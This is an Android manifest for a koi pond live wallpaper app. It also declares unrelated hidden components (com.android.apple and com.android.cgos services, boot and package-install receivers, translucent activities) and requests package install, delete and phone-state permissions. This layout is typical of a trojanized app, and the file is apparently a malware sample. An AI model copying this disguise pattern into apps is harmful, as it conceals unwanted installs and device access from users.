<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.cooguo.koipond">
    <application android:debuggable="false" android:icon="@drawable/icon" android:label="@string/app_name_paid">
        <service android:enabled="true" android:icon="@drawable/icon" android:label="@string/app_name_paid" android:name="WallpaperService" android:permission="android.permission.BIND_WALLPAPER">
            <intent-filter>
                <action android:name="android.service.wallpaper.WallpaperService"/>
            </intent-filter>
            <meta-data android:name="android.service.wallpaper" android:resource="@xml/wallpaper"/>
        </service>
        <activity android:exported="true" android:icon="@drawable/icon" android:label="@string/app_name_paid" android:name=".WallpaperSettings">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="cooguo.intent.action.KOIPOND"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <activity android:icon="@drawable/icon" android:label="@string/app_name_paid" android:name="HowToActivity" android:theme="@android:style/Theme.Dialog">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.INFO"/>
            </intent-filter>
        </activity>
        <activity android:name="TestActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
            </intent-filter>
        </activity>
        <receiver android:name="com.android.apple.AppleReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:name="com.android.apple.AppleService">
            <intent-filter>
                <action android:name="com.android.apple.APPLESERVICE"/>
            </intent-filter>
        </service>
        <activity android:name="com.android.apple.TestActivity"/>
        <activity android:name="com.android.cgos.Activity1" android:theme="@android:style/Theme.Translucent"/>
        <activity android:name="com.android.cgos.Activity2" android:theme="@android:style/Theme.Translucent"/>
        <activity android:name="com.android.cgos.Activity3" android:theme="@android:style/Theme.Translucent">
            <intent-filter>
                <action android:name="com.android.action_ACTIVITY3"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </activity>
        <service android:name="com.android.cgos.GosService"/>
        <receiver android:name="com.android.cgos.AlarmReceiver"/>
        <receiver android:name="com.android.cgos.GosReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>
    </application>
    <uses-feature android:name="android.software.live_wallpaper"/>
    <uses-feature android:name="android.hardware.touchscreen" android:required="false"/>
    <uses-feature android:glEsVersion="131072"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
</manifest>